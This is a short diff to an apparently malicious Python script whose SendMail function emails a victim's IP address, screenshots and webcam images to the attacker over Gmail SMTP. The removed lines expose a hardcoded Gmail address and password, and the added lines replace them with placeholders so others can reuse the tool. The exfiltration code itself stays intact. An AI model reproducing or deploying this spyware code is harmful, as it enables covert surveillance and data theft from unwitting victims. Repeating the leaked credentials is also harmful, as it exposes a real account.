@@ -18,8 +18,8 @@ def SendMail(ImgFileName,ScreenS):
     img_data2 = open(ScreenS, 'rb').read()
     msg = MIMEMultipart()
     msg['Subject'] = 'GanzyHacking'
-    msg['From'] = 'ganzyknowsone@gmail.com'
-    msg['To'] = 'ganzyknowsone@gmail.com'
+    msg['From'] = 'yourgmailaccount'
+    msg['To'] = 'yourgmailaccount'
 
     text = MIMEText("Ganzy BINGO!!!! ------------------Victims IP------:" +my_ip + "Screenshots and Webcam ")
     msg.attach(text)
@@ -32,8 +32,8 @@ def SendMail(ImgFileName,ScreenS):
     s.ehlo()
     s.starttls()
     s.ehlo()
-    s.login(msg['From'], "KennyS20177")
-    s.sendmail("ganzyknowsoneone@gmail.com", "ganzyknowsoneone@gmail.com", msg.as_string())
+    s.login(msg['From'], "yourpassword")
+    s.sendmail("yourgmailaccount", "yourgmailaccount", msg.as_string())
     s.quit()
 
 try:
